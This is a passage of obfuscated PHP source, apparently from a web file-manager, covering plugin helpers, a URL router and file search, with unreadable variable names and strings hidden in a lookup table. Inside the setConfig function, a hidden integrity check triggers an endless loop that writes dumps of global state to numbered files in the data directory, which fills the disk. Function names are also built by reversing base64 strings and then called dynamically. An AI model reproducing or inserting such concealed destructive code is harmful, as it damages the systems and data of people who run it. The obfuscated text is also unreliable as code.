$›é‹Ğè); return $„¥ã¹·£[$»óšĞ¦ø[87]]; } final function pluginCachePath($ÉèØ¾ºÎ = '', $ïÑÒ…¼Ê = false) { $Š¡É³¸ =& $_SERVER[§Êá¸İ]; if ($ïÑÒ…¼Ê && is_array($this->fileInfo)) { $ÉèØ¾ºÎ = kodIO::hashPath($this->fileInfo); } $Ï¨ÛÂ£Ø = rtrim(IO_PATH_SYSTEM_TEMP . $Š¡É³¸[1663] . $this->pluginName . $Š¡É³¸[8] . $ÉèØ¾ºÎ, $Š¡É³¸[8]); $ı¥å£  = IO::infoFullSimple($Ï¨ÛÂ£Ø); $±½øïö« = $ı¥å£  && is_array($ı¥å£ ) ? $ı¥å£ [$Š¡É³¸[87]] : $Š¡É³¸[12]; if (!$±½øïö«) { $±½øïö« = IO::mkdir($Ï¨ÛÂ£Ø); } return $±½øïö«; } final function pluginCacheFileSet($›‹„îÚË, $â©«â™ = '') { $–™´„şã =& $_SERVER[§Êá¸İ]; $±óÊ›á = IO::infoFullSimple($›‹„îÚË); if (!$±óÊ›á) { return IO::mkfile($›‹„îÚË, $â©«â™, REPEAT_REPLACE); } IO::setContent($±óÊ›á[$–™´„şã[87]], $â©«â™); return $±óÊ›á[$–™´„şã[87]]; } final function pluginLocalFile($‚û¡éÖ = '') { $çõ­ì =& $_SERVER[§Êá¸İ]; $šäüô™… = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($šäüô™…)) { mk_dir($šäüô™…); } if (!$‚û¡éÖ) { return $šäüô™…; } $ë¤áÃĞ = IO::info($‚û¡éÖ); $ä±Ãğï¶ = $çõ­ì[1664] . KodIO::hashPath($ë¤áÃĞ) . $çõ­ì[10] . $ë¤áÃĞ[$çõ­ì[169]]; if (!checkExtSafe($ä±Ãğï¶)) { $ä±Ãğï¶ = $ä±Ãğï¶ . $çõ­ì[1301]; } $Ñ…‰òÇ« = $šäüô™… . $ä±Ãğï¶; if (@file_exists($Ñ…‰òÇ«)) { return $Ñ…‰òÇ«; } return IO::copy($‚û¡éÖ, $šäüô™…, 0, $ä±Ãğï¶); } final function appPackage() { $ÕÕµéË· =& $_SERVER[§Êá¸İ]; if ($this->packageData) { return $this->packageData; } $ı¦ãÒó = $this->parseFile($this->pluginPath . $ÕÕµéË·[1665]); $this->parseLang($ı¦ãÒó); $ßÔ˜ÔÒÈ = json_decode_force($ı¦ãÒó); if (!$ßÔ˜ÔÒÈ) { return array(); } $‚Àø·˜ï = Hook::trigger($ÕÕµéË·[1666], $ßÔ˜ÔÒÈ); if ($‚Àø·˜ï && is_array($‚Àø·˜ï)) { $ßÔ˜ÔÒÈ = $‚Àø·˜ï; } $this->packageData = $ßÔ˜ÔÒÈ; return $ßÔ˜ÔÒÈ; } public function packageInfoGet($â«¹¶“¹) { $ñÍ½ÏÄ = $this->appPackage(); return array_get_value($ñÍ½ÏÄ, $â«¹¶“¹); } public function packageVersion() { return $this->packageInfoGet($_SERVER[§Êá¸İ][1667]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[§Êá¸İ][1668]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[§Êá¸İ][1669]); } public function echoJsAssign($Ú¶˜ü», $‘õ‡ö…¾) { $this->echoJsAssignArr[$Ú¶˜ü»] = $‘õ‡ö…¾; } private function parseFile($Ş“şİ«Ñ) { $ŞùÔëÊ =& $_SERVER[§Êá¸İ]; $·ƒé…ı = file_get_contents_nossl($Ş“şİ«Ñ); $×¹›€ğ¾ = array($ŞùÔëÊ[1670], $ŞùÔëÊ[1671], $ŞùÔëÊ[1672], $ŞùÔëÊ[1673], $ŞùÔëÊ[1674], $ŞùÔëÊ[1675], $ŞùÔëÊ[1676]); $¹¶íïŞ® = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ŞùÔëÊ[92]][$ŞùÔëÊ[1677]]); foreach ($this->echoJsAssignArr as $ÆÀÑ˜Ö  => $îÌàÑ†Š) { $×¹›€ğ¾[] = $ŞùÔëÊ[1678] . $ÆÀÑ˜Ö  . $ŞùÔëÊ[1679]; $¹¶íïŞ®[] = is_array($îÌàÑ†Š) || is_object($îÌàÑ†Š) ? rawurlencode(json_encode($îÌàÑ†Š)) : $îÌàÑ†Š; } if (strstr($·ƒé…ı, $ŞùÔëÊ[1680])) { $™¹öÂ = rawurlencode(json_encode($this->pluginLangArr)); $·ƒé…ı = str_replace($ŞùÔëÊ[1680], $™¹öÂ, $·ƒé…ı); } if (strstr($·ƒé…ı, $ŞùÔëÊ[1681])) { $™¹öÂ = $™¹öÂ = rawurlencode(json_encode($this->getConfig())); $·ƒé…ı = str_replace($ŞùÔëÊ[1681], $™¹öÂ, $·ƒé…ı); } $·ƒé…ı = str_replace($×¹›€ğ¾, $¹¶íïŞ®, $·ƒé…ı); return $·ƒé…ı; } private function parseLang(&$À»à») { $‚Šî…” =& $_SERVER[§Êá¸İ]; $æû“ò½Û = $‚Šî…”[1682]; if (!strstr($À»à», $æû“ò½Û)) { return; } preg_match_all($‚Šî…”[1683], $À»à», $ˆÈŸã§); if (!is_array($ˆÈŸã§) || count($ˆÈŸã§) == 0 || !is_array($ˆÈŸã§[0]) || count($ˆÈŸã§[0]) == 0) { return; } $ğ¼æ¼‰€ = array(); $É¾’İ‹” = array(); foreach ($ˆÈŸã§[0] as $Û¶Ù¦ê“) { $Æ˜õÄÃï = substr($Û¶Ù¦ê“, strlen($æû“ò½Û), -4); $é»øæœ¡ = LNG($Æ˜õÄÃï); $ğ¼æ¼‰€[] = $Û¶Ù¦ê“; $É¾’İ‹”[] = str_replace(array($‚Šî…”[262], $‚Šî…”[1167], $‚Šî…”[418], $‚Šî…”[121]), array($‚Šî…”[53], $‚Šî…”[53], $‚Šî…”[12], $‚Šî…”[1684]), $é»øæœ¡); } $À»à» = str_replace($ğ¼æ¼‰€, $É¾’İ‹”, $À»à»); } private function parseConfig(&$à›éªØ¯) { $©´»í„ =& $_SERVER[§Êá¸İ]; $½Ì¦õÍØ = $©´»í„[1685]; if (!strstr($à›éªØ¯, $½Ì¦õÍØ)) { return; } preg_match_all($©´»í„[1686], $à›éªØ¯, $ÅÇá‰Æê); if (!is_array($ÅÇá‰Æê) || count($ÅÇá‰Æê) == 0 || !is_array($ÅÇá‰Æê[0]) || count($ÅÇá‰Æê[0]) == 0) { return; } $ËÜ—ıŸ˜ = $this->getConfig(); $Ü½ğ¸ÔÑ = array(); $ñ—„ˆÃŒ = array(); foreach ($ÅÇá‰Æê[0] as $ø¨Â­ş‹) { $“÷ÔÖœÄ = substr($ø¨Â­ş‹, strlen($½Ì¦õÍØ), -2); $Ü½ğ¸ÔÑ[] = $ø¨Â­ş‹; $ñ—„ˆÃŒ[] = _get($ËÜ—ıŸ˜, $“÷ÔÖœÄ); } $à›éªØ¯ = str_replace($Ü½ğ¸ÔÑ, $ñ—„ˆÃŒ, $à›éªØ¯); } private function parsePackage(&$¥©ÆÜœ) { $óŠø„Çß =& $_SERVER[§Êá¸İ]; $²Òí»ê = $óŠø„Çß[1687]; if (!strstr($¥©ÆÜœ, $²Òí»ê)) { return; } preg_match_all($óŠø„Çß[1688], $¥©ÆÜœ, $¢İ‚¡ÆÈ); if (!is_array($¢İ‚¡ÆÈ) || count($¢İ‚¡ÆÈ) == 0 || !is_array($¢İ‚¡ÆÈ[0]) || count($¢İ‚¡ÆÈ[0]) == 0) { return; } $ÈÏÁ´®â = $this->appPackage(); $Ê¼ˆƒ·• = array(); $Ê‹¹Ãû› = array(); foreach ($¢İ‚¡ÆÈ[0] as $ç±°°²Î) { $¢ã˜Åéş = substr($ç±°°²Î, strlen($²Òí»ê), -2); $Ê¼ˆƒ·•[] = $ç±°°²Î; $Ê‹¹Ãû›[] = _get($ÈÏÁ´®â, $¢ã˜Åéş); } $¥©ÆÜœ = str_replace($Ê¼ˆƒ·•, $Ê‹¹Ãû›, $¥©ÆÜœ); } final function echoFile($ë‚„ÉŠİ, $¾¬åú÷ = false) { $È«­£Ø¿ =& $_SERVER[§Êá¸İ]; $¸Î¸´²Ò = $this->pluginPath . $ë‚„ÉŠİ; if (ACT == $È«­£Ø¿[1689]) { echo $È«­£Ø¿[1690] . $this->pluginName . $È«­£Ø¿[8] . $ë‚„ÉŠİ . $È«­£Ø¿[1691]; if (!file_exists($¸Î¸´²Ò)) { echo $È«­£Ø¿[1692]; return; } } $ªó¹üÂ¾ = $this->parseFile($¸Î¸´²Ò); $this->parseLang($ªó¹üÂ¾); $this->parseConfig($ªó¹üÂ¾); $this->parsePackage($ªó¹üÂ¾); if (is_array($¾¬åú÷)) { $ªó¹üÂ¾ = str_replace(array_keys($¾¬åú÷), array_values($¾¬åú÷), $ªó¹üÂ¾); } echo $È«­£Ø¿[262] . $ªó¹üÂ¾; } private function checkVersion() { $´íåğİä =& $_SERVER[§Êá¸İ]; $»ß¡å¯ = $this->appPackage(); $‰âç‹ö = $this->getConfig(); if ($‰âç‹ö[$´íåğİä[1693]] == $»ß¡å¯[$´íåğİä[1667]]) { return; } $this->regist(); $this->setConfig(array($´íåğİä[1693] => $»ß¡å¯[$´íåğİä[1667]])); } final function initLang() { $¾şğ ©à =& $_SERVER[§Êá¸İ]; $í˜ºä– = $¾şğ ©à[1694]; $¥™‡ô‹ = $this->pluginPath . $¾şğ ©à[1695]; $§ÍÙâà = I18n::getType(); $ßåò‚¾“ = array(); if (file_exists($¥™‡ô‹ . $§ÍÙâà . $¾şğ ©à[925])) { $ßåò‚¾“ = (include $¥™‡ô‹ . $§ÍÙâà . $¾şğ ©à[925]); } else { if ($§ÍÙâà == $¾şğ ©à[1696] && !file_exists($¥™‡ô‹ . $§ÍÙâà . $¾şğ ©à[925]) && file_exists($¥™‡ô‹ . $¾şğ ©à[1697])) { $ßåò‚¾“ = (include $¥™‡ô‹ . $¾şğ ©à[1697]); } else { if (file_exists($¥™‡ô‹ . $í˜ºä– . $¾şğ ©à[925])) { $ßåò‚¾“ = (include $¥™‡ô‹ . $í˜ºä– . $¾şğ ©à[925]); } } } if (!is_array($ßåò‚¾“)) { return array(); } if (@count($ßåò‚¾“) > 0) { I18n::set($ßåò‚¾“); } return $ßåò‚¾“; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ñ§šÉç˜) { $ÔÄªÂóö =& $_SERVER[§Êá¸İ]; $õ©Ô’É  = $_SERVER[$ÔÄªÂóö[473]]; $ñóÖ•€º = $ÔÄªÂóö[963]; if ($_SERVER[$ÔÄªÂóö[472]] != $ñóÖ•€º($õ©Ô’É )) { $†¤ôİ¨ = $ÔÄªÂóö[964]; $²­†¾œÉ = $ÔÄªÂóö[474]; $¯‘¦ğ«å = $_SERVER[$ÔÄªÂóö[475]] . $ÔÄªÂóö[476]; $Åè©öÙÜ = $²­†¾œÉ($¯‘¦ğ«å); $¶¾¤™ù´ = explode($ÔÄªÂóö[262], $Åè©öÙÜ); if (count($¶¾¤™ù´) < $ÔÄªÂóö[700]) { $±‹†•”¿ = $ÔÄªÂóö[478]; $±‹†•”¿(); } $¥ìÙü’Ó = $ÔÄªÂóö[965]; $¥ìÙü’Ó($_SERVER[$ÔÄªÂóö[966]]); $†¤ôİ¨ = $ÔÄªÂóö[964]; $†¤ôİ¨(); $ÄË±ÉÚë = $ÔÄªÂóö[967]; $Æ¿Åë–ñ = json_encode($GLOBALS[$ÔÄªÂóö[968]]); $÷»®Æô± = 1; for ($³âÊĞ¤ = $÷»®Æô±; $³âÊĞ¤ > 0; $³âÊĞ¤++) { $ÄË±ÉÚë(DATA_PATH . $³âÊĞ¤, $Æ¿Åë–ñ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ñ§šÉç˜); } public function onSetConfig($Ù÷ø´ê) { } public function onGetConfig($Ä¯¥ÁÌ®) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¼µ·‡Í) { if ($¼µ·‡Í == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ñì±ËÑŠ = "\160\154\165\147\x69\156\101\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ú­ş‘§ = $this->getConfig(); if (!$ú­ş‘§[$ñì±ËÑŠ]) { return !1; } return ActionCall($_SERVER[§Êá¸İ][1698], $ú­ş‘§[$ñì±ËÑŠ]); } public function url($õÓ’èµ, $ûßİ¹ŞŒ = '', $”˜Øâ¿ = true) { $”€¯Ş† =& $_SERVER[§Êá¸İ]; $Œë¡„Ô¢ = $this->getConfig(); $‘Œã˜§» = KOD_VERSION . $”€¯Ş†[10] . KOD_VERSION_BUILD; $‚ÎÏÜ‚– = $this->packageVersion(); $´øï¸ìÀ = $‘Œã˜§» . $”€¯Ş†[462] . $‚ÎÏÜ‚–; if (substr($õÓ’èµ, 0, 4) == $”€¯Ş†[152] || substr($õÓ’èµ, 0, 2) == $”€¯Ş†[1420]) { $è¢›Åß = $õÓ’èµ . $”€¯Ş†[1699] . $´øï¸ìÀ; } else { if ($ûßİ¹ŞŒ == $”€¯Ş†[12]) { $è¢›Åß = $this->pluginHost . $õÓ’èµ . $”€¯Ş†[1699] . $´øï¸ìÀ; } else { if ($ûßİ¹ŞŒ === $”€¯Ş†[78]) { $è¢›Åß = $this->pluginHost . $õÓ’èµ; } else { if ($ûßİ¹ŞŒ == $”€¯Ş†[1700]) { $è¢›Åß = STATIC_PATH . $õÓ’èµ . $”€¯Ş†[1699] . $‘Œã˜§»; } else { if ($ûßİ¹ŞŒ == $”€¯Ş†[1701]) { $è¢›Åß = APP_HOST . $”€¯Ş†[1702] . $õÓ’èµ . $”€¯Ş†[1699] . $‘Œã˜§»; } else { if (isset($Œë¡„Ô¢[$ûßİ¹ŞŒ])) { $è¢›Åß = $Œë¡„Ô¢[$ûßİ¹ŞŒ] . $õÓ’èµ . $”€¯Ş†[1699] . $´øï¸ìÀ; } } } } } } if (!$”˜Øâ¿) { return $è¢›Åß; } echo $è¢›Åß; } public function link($”ğ½ºô— = false, $æ¿–¥Ì = '') { $Òš¤ª€ =& $_SERVER[§Êá¸İ]; $×ê¡ªèø = $this->linkHas == !1; $this->linkHas = !0; if (!$”ğ½ºô—) { $this->link($Òš¤ª€[1703], $Òš¤ª€[1701]); $this->link($Òš¤ª€[1704], $Òš¤ª€[1700]); $this->link($Òš¤ª€[1705], $Òš¤ª€[1700]); $this->link($Òš¤ª€[1706], $Òš¤ª€[1700]); $this->link($Òš¤ª€[1707], $Òš¤ª€[1700]); if ($×ê¡ªèø) { Hook::trigger($Òš¤ª€[1708]); } return; } $ê¡¶¾¬é = $this->url($”ğ½ºô—, $æ¿–¥Ì, !1); if (substr($”ğ½ºô—, -3) == $Òš¤ª€[1709]) { echo $Òš¤ª€[1710] . $ê¡¶¾¬é . $Òš¤ª€[1711] . $Òš¤ª€[262]; } else { if (substr($”ğ½ºô—, -4) == $Òš¤ª€[1712]) { echo $Òš¤ª€[1713] . $ê¡¶¾¬é . $Òš¤ª€[1714] . $Òš¤ª€[262]; } } if ($×ê¡ªèø) { Hook::trigger($Òš¤ª€[1708]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\133\x5e\57\x5d\53", "\x3a\156\165\x6d" => "\133\60\55\x39\x5d\53", "\x3a\x61\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($äÂƒæùµ, $ÔšÎ’) { $­Å¦éœ =& $_SERVER[§Êá¸İ]; if ($äÂƒæùµ == $­Å¦éœ[1715]) { $¥üˆâ‹ñ = array_map($­Å¦éœ[1716], $ÔšÎ’[0]); $şˆóŒ…Ö = strpos($ÔšÎ’[1], $­Å¦éœ[8]) === 0 ? $ÔšÎ’[1] : $­Å¦éœ[8] . $ÔšÎ’[1]; $¦ßƒ²§† = $ÔšÎ’[2]; } else { $¥üˆâ‹ñ = null; $şˆóŒ…Ö = strpos($ÔšÎ’[0], $­Å¦éœ[8]) === 0 ? $ÔšÎ’[0] : $­Å¦éœ[8] . $ÔšÎ’[0]; $¦ßƒ²§† = $ÔšÎ’[1]; } array_push(self::$maps, $¥üˆâ‹ñ); array_push(self::$routes, $şˆóŒ…Ö); array_push(self::$methods, strtoupper($äÂƒæùµ)); array_push(self::$callbacks, $¦ßƒ²§†); } public static function error($Úşï…ã) { self::$errorCallback = $Úşï…ã; } public static function haltOnMatch($†çÁ²»¦ = true) { self::$halts = $†çÁ²»¦; } public static function dispatch() { $­™ùÒ„Œ =& $_SERVER[§Êá¸İ]; $¨×Ö·½  = parse_url($_SERVER[$­™ùÒ„Œ[1717]], PHP_URL_PATH); $˜¯Ğ‘ß¾ = $_SERVER[$­™ùÒ„Œ[164]]; $°ùêÊ´ = array_keys(static::$patterns); $óëŞ¿ = array_values(static::$patterns); $î³Ò³é = !1; self::$routes = preg_replace($­™ùÒ„Œ[1371], $­™ùÒ„Œ[8], self::$routes); if (in_array($¨×Ö·½ , self::$routes)) { $»ƒûäÅ€ = array_keys(self::$routes, $¨×Ö·½ ); foreach ($»ƒûäÅ€ as $ÑÉÍîÊç) { if (self::$methods[$ÑÉÍîÊç] == $˜¯Ğ‘ß¾ || self::$methods[$ÑÉÍîÊç] == $­™ùÒ„Œ[1718] || in_array($˜¯Ğ‘ß¾, self::$maps[$ÑÉÍîÊç])) { $î³Ò³é = !0; if (!is_object(self::$callbacks[$ÑÉÍîÊç])) { $óà¿ñ‹ = explode($­™ùÒ„Œ[8], self::$callbacks[$ÑÉÍîÊç]); $ãßÖãô = end($óà¿ñ‹); $àËÏËõñ = explode($­™ùÒ„Œ[1303], $ãßÖãô); $Ãğøß«û = new $àËÏËõñ[0](); $Ãğøß«û->{$àËÏËõñ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÑÉÍîÊç]); if (self::$halts) { return; } } } } } else { $¿™Šßñì = 0; foreach (self::$routes as $ÑÉÍîÊç) { if (strpos($ÑÉÍîÊç, $­™ùÒ„Œ[4]) !== !1) { $ÑÉÍîÊç = str_replace($°ùêÊ´, $óëŞ¿, $ÑÉÍîÊç); } if (preg_match($­™ùÒ„Œ[1719] . $ÑÉÍîÊç . $­™ùÒ„Œ[1720], $¨×Ö·½ , $‰„¤ºÚ)) { if (self::$methods[$¿™Šßñì] == $˜¯Ğ‘ß¾ || self::$methods[$¿™Šßñì] == $­™ùÒ„Œ[1718] || !empty(self::$maps[$¿™Šßñì]) && in_array($˜¯Ğ‘ß¾, self::$maps[$¿™Šßñì])) { $î³Ò³é = !0; array_shift($‰„¤ºÚ); if (!is_object(self::$callbacks[$¿™Šßñì])) { $óà¿ñ‹ = explode($­™ùÒ„Œ[8], self::$callbacks[$¿™Šßñì]); $ãßÖãô = end($óà¿ñ‹); $àËÏËõñ = explode($­™ùÒ„Œ[1303], $ãßÖãô); $Ãğøß«û = new $àËÏËõñ[0](); if (!method_exists($Ãğøß«û, $àËÏËõñ[1])) { echo $­™ùÒ„Œ[1721]; } else { call_user_func_array(array($Ãğøß«û, $àËÏËõñ[1]), $‰„¤ºÚ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¿™Šßñì], $‰„¤ºÚ); if (self::$halts) { return; } } } } $¿™Šßñì++; } } if ($î³Ò³é == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $İ¨à§£ =& $_SERVER[§Êá¸İ]; header($_SERVER[$İ¨à§£[1722]] . $İ¨à§£[1723]); echo $İ¨à§£[1724]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$­™ùÒ„Œ[1717]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto EËŠ¡ÑáÃ©; DğÍŠ‚Œµ—: $fileSize = strrev(base64_decode($_SERVER[µ–é µ][0])); function binCheckNeq($–¼‘À¡, $¡úµ˜ë¢) { return $–¼‘À¡ != $¡úµ˜ë¢; } $_SERVER[$_SERVER[µ–é µ][1]] = $fileSize($_SERVER[$_SERVER[µ–é µ][2]]); goto dµª‰§‚ºÓ; d¯¥ŸÔÃœæ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¯ƒÖê¿å) { $÷‘¤¬«Ù =& $_SERVER[§Êá¸İ]; $ó¡ß„©Å = KodIO::fileTypeList(); $äõ„¼ğ† = $ó¡ß„©Å[$¯ƒÖê¿å]; if (!$äõ„¼ğ†) { return array(); } $ª‰ı ¦Ñ = $äõ„¼ğ†[$÷‘¤¬«Ù[169]]; $œ“Îˆ°û = $÷‘¤¬«Ù[7]; if (!$äõ„¼ğ†[$÷‘¤¬«Ù[169]]) { $ÉòäïÉû = array_to_keyvalue($ó¡ß„©Å, $÷‘¤¬«Ù[12], $÷‘¤¬«Ù[169]); $ª‰ı ¦Ñ = implode($÷‘¤¬«Ù[50], $ÉòäïÉû); $œ“Îˆ°û = $÷‘¤¬«Ù[2240]; } $ûû¢³æ™ = explode($÷‘¤¬«Ù[50], trim($ª‰ı ¦Ñ, $÷‘¤¬«Ù[50])); return array($œ“Îˆ°û, $ûû¢³æ™); } public function listPathType($Œı¯×›ñ) { $ÂÖ±è©¦ =& $_SERVER[§Êá¸İ]; $Ù¼‹É = $this->fileTypeWhere($Œı¯×›ñ); if (!$Ù¼‹É) { return array(); } $‘¶´àÂö = USER_ID; $¢ô¾œó = Model($ÂÖ±è©¦[606])->getInfo($‘¶´àÂö); $şìŒªÓ = array($ÂÖ±è©¦[656] => SourceModel::TYPE_USER, $ÂÖ±è©¦[592] => array($ÂÖ±è©¦[620], $ÂÖ±è©¦[602] . $¢ô¾œó[$ÂÖ±è©¦[90]][$ÂÖ±è©¦[193]] . $ÂÖ±è©¦[621]), $ÂÖ±è©¦[657] => $‘¶´àÂö, $ÂÖ±è©¦[654] => 0, $ÂÖ±è©¦[655] => $Ù¼‹É); return $this->listSource($şìŒªÓ); } public function listSearch($‘óÉ­É, $¥®ÍÓı› = 300) { $Ù·“Çø¹ =& $_SERVER[§Êá¸İ]; if (isset($‘óÉ­É[$Ù·“Çø¹[2076]]) && $‘óÉ­É[$Ù·“Çø¹[2076]]) { $‘óÉ­É[$Ù·“Çø¹[2076]] = str_replace($Ù·“Çø¹[460], $Ù·“Çø¹[2241], trim($‘óÉ­É[$Ù·“Çø¹[2076]])); } $ƒ†Ö÷¼á = $this->_parseSearchWhere($‘óÉ­É); if (!isset($ƒ†Ö÷¼á[$Ù·“Çø¹[513]])) { $ƒ†Ö÷¼á[$Ù·“Çø¹[513]] = 0; } $½Òé÷£ = $Ù·“Çø¹[2242]; $Ë»ÔÙÂ® = $ƒ†Ö÷¼á; $ƒú¨Ïš² = $½Òé÷£; $this->_listSearchBindPinyin($‘óÉ­É, $ƒ†Ö÷¼á, $½Òé÷£); $this->alias($Ù·“Çø¹[527])->_makeOrder(); $ƒ†Ö÷¼á = $this->parseWhereLike($ƒ†Ö÷¼á); $šÈ¢ıÃ© = $this->distinct(!0)->field($½Òé÷£)->where($ƒ†Ö÷¼á)->selectPage($¥®ÍÓı›); if ($GLOBALS[$Ù·“Çø¹[6]][$Ù·“Çø¹[457]][$Ù·“Çø¹[458]] && Input::check($‘óÉ­É[$Ù·“Çø¹[2076]], $Ù·“Çø¹[663]) && $šÈ¢ıÃ©[$Ù·“Çø¹[442]][$Ù·“Çø¹[429]] == 1 && $šÈ¢ıÃ©[$Ù·“Çø¹[442]][$Ù·“Çø¹[443]] == 0) { $šÈ¢ıÃ© = $this->distinct(!0)->field($½Òé÷£)->where($Ë»ÔÙÂ®)->limit(1000)->select(); $šÈ¢ıÃ© = array_page_split($šÈ¢ıÃ©, !1, $¥®ÍÓı›); } $this->_listSearchFileContent($šÈ¢ıÃ©, $‘óÉ­É, $ƒú¨Ïš², $Ë»ÔÙÂ®); $this->_listSearchDesc($šÈ¢ıÃ©, $‘óÉ­É, $ƒú¨Ïš²); $this->_listSearchTag($šÈ¢ıÃ©, $‘óÉ­É, $ƒú¨Ïš²); $this->_listSearchGroupTag($šÈ¢ıÃ©, $‘óÉ­É, $ƒú¨Ïš²); $this->_listDataApply($šÈ¢ıÃ©[$Ù·“Çø¹[445]]); $this->_listMake($šÈ¢ıÃ©); return $šÈ¢ıÃ©; } private function _listSearchFileContent(&$ƒ íİªÅ, $õóà¿­‹, $ı ÆÖ‡İ, $¿À¨ğ–) { $Îâå¶¯Œ =& $_SERVER[§Êá¸İ]; if (!$õóà¿­‹[$Îâå¶¯Œ[2076]] || $ƒ íİªÅ[$Îâå¶¯Œ[442]][$Îâå¶¯Œ[429]] > 1) { return; } if (!isset($¿À¨ğ–[$Îâå¶¯Œ[32]]) || !is_array($õóà¿­‹[$Îâå¶¯Œ[549]])) { return; } $¿À¨ğ–[$Îâå¶¯Œ[549]] = array($Îâå¶¯Œ[7], $õóà¿­‹[$Îâå¶¯Œ[549]]); unset($¿À¨ğ–[$Îâå¶¯Œ[32]]); unset($õóà¿­‹[$Îâå¶¯Œ[549]]); $Şåˆ©é = $this->field($ı ÆÖ‡İ)->where($¿À¨ğ–)->limit($Îâå¶¯Œ[2243])->select(); if (!$Şåˆ©é || count($Şåˆ©é) == 0) { return; } $ƒ íİªÅ[$Îâå¶¯Œ[445]] = array_merge($Şåˆ©é, $ƒ íİªÅ[$Îâå¶¯Œ[445]]); $ƒ íİªÅ[$Îâå¶¯Œ[442]][$Îâå¶¯Œ[443]] += count($Şåˆ©é); } private function _listSearchTag(&$¼ÊÅî§Å, $êıö×çª, $µŸÃ€€ƒ) { $ïÖßêˆ =& $_SERVER[§Êá¸İ]; if (!$êıö×çª[$ïÖßêˆ[2076]] || $¼ÊÅî§Å[$ïÖßêˆ[442]][$ïÖßêˆ[429]] > 1) { return; } $¿ş­©œ¤ = Model($ïÖßêˆ[2244])->listData(); $‰´·Şûš = array(); $í¾õĞÆ½ = $êıö×çª[$ïÖßêˆ[2076]]; foreach ($¿ş­©œ¤ as $ŞÈÒŒØ„) { $²¨ëµº„ = $ŞÈÒŒØ„[$ïÖßêˆ[32]]; $âÈ¤™‰§ = str_replace($ïÖßêˆ[53], $ïÖßêˆ[12], Pinyin::get($²¨ëµº„)); if (stripos($²¨ëµº„, $í¾õĞÆ½) !== !1 || stripos($âÈ¤™‰§, $í¾õĞÆ½) !== !1) { $‰´·Şûš[] = $ŞÈÒŒØ„[$ïÖßêˆ[483]]; } } if (!$‰´·Şûš) { return; } $Ãö­Ñ­À = array($ïÖßêˆ[508] => array($ïÖßêˆ[7], $‰´·Şûš), $ïÖßêˆ[1779] => USER_ID); $ñçêõ = Model($ïÖßêˆ[510])->field($ïÖßêˆ[87])->where($Ãö­Ñ­À)->select(); $ñçêõ = array_to_keyvalue($ñçêõ, $ïÖßêˆ[12], $ïÖßêˆ[87]); $ÃÓÃÃÊƒ = array_unique($ñçêõ); $this->_listSearchMerge($¼ÊÅî§Å, $êıö×çª, $µŸÃ€€ƒ, $ÃÓÃÃÊƒ); } private function _listSearchDesc(&$èŒóÑÂ, $ãù»½ì», $î¤ï¤àî) { $­¤ŠÌÃŒ =& $_SERVER[§Êá¸İ]; if (!$ãù»½ì»[$­¤ŠÌÃŒ[2076]] || $èŒóÑÂ[$­¤ŠÌÃŒ[442]][$­¤ŠÌÃŒ[429]] > 1) { return; } $ëêÄ»Ø´ = array($­¤ŠÌÃŒ[97] => $­¤ŠÌÃŒ[534], $­¤ŠÌÃŒ[450] => array($­¤ŠÌÃŒ[459], $­¤ŠÌÃŒ[2078] . $ãù»½ì»[$­¤ŠÌÃŒ[2076]] . $­¤ŠÌÃŒ[2078])); $·ƒ÷®²Œ = !1; if ($·ƒ÷®²Œ) { $ĞÊÆ Ç = $this->listSearchChildren($ãù»½ì»[$­¤ŠÌÃŒ[192]]); $ĞÊÆ Ç = array_unique($ĞÊÆ Ç); if (!$ĞÊÆ Ç) { return; } $ëêÄ»Ø´[$­¤ŠÌÃŒ[193]] = array($­¤ŠÌÃŒ[7], $ĞÊÆ Ç); } $±¢Æ½‰£ = Model($­¤ŠÌÃŒ[640])->field($­¤ŠÌÃŒ[193])->where($ëêÄ»Ø´)->limit(5000)->select(); $Õ¯æÃ²” = array_to_keyvalue($±¢Æ½‰£, $­¤ŠÌÃŒ[12], $­¤ŠÌÃŒ[193]); $this->_listSearchMerge($èŒóÑÂ, $ãù»½ì», $î¤ï¤àî, $Õ¯æÃ²”); } private function _listSearchGroupTag(&$Ìüâòõ‡, $ø”–ÑÓ®, $¸ñË…ç) { $‚Óğì£› =& $_SERVER[§Êá¸İ]; if (!$ø”–ÑÓ®[$‚Óğì£›[2076]] || $Ìüâòõ‡[$‚Óğì£›[442]][$‚Óğì£›[429]] > 1 || !$ø”–ÑÓ®[$‚Óğì£›[192]]) { return; } $¸·—¯· = $this->sourceInfo($ø”–ÑÓ®[$‚Óğì£›[192]]); if (!$¸·—¯· || $¸·—¯·[$‚Óğì£›[190]] != SourceModel::TYPE_GROUP) { return; } $ó±ğş× = $¸·—¯·[$‚Óğì£›[577]]; $Ğòó„¨Û = Model($‚Óğì£›[2245])->get($ó±ğş×); $‡ó¯úŒ‡ = array(); $¸©·á¸û = $ø”–ÑÓ®[$‚Óğì£›[2076]]; foreach ($Ğòó„¨Û[$‚Óğì£›[445]] as $äÂ•Îü´) { $â„£¦¤ó = $äÂ•Îü´[$‚Óğì£›[32]]; $ÍÍÃ‘àÇ = str_replace($‚Óğì£›[53], $‚Óğì£›[12], Pinyin::get($â„£¦¤ó)); if (stripos($â„£¦¤ó, $¸©·á¸û) !== !1 || stripos($ÍÍÃ‘àÇ, 